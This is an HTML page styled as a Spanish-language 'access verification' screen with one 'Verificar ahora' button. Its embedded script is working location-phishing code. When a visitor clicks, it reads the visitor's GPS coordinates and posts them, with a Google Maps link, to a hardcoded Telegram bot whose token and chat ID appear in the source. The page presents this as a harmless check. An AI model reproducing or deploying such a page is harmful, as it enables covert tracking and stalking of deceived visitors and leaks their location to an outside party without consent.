<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Verificación de Acceso</title>
    <style>
        body { font-family: system-ui; text-align: center; padding: 50px; background: #0a0f1e; color: white; }
        button { background: #2b6ef0; padding: 16px 28px; border-radius: 60px; border: none; font-size: 1rem; color: white; cursor: pointer; }
    </style>
</head>
<body>
    <h2>📡 Verificación de Acceso</h2>
    <button id="btn">✅ Verificar ahora</button>
    <script>
        const BOT_TOKEN ='8803149571:AAHb4seP9jcK9uv9Tfc7vQiZseyo_c6rcw';
        const CHAT_ID ='7555997298';
        document.getElementById('btn').onclick = () => {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lng}`;
                    const mensaje = `📍 Ubicación capturada:\nLat: ${lat}\nLng: ${lng}\nMapa: ${mapsLink}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
                    });
                    alert('✅ Datos enviados');
                }, err => alert('❌ Error: ' + err.message));
            } else alert('❌ No soportado');
        };
    </script>
</body>
</html>
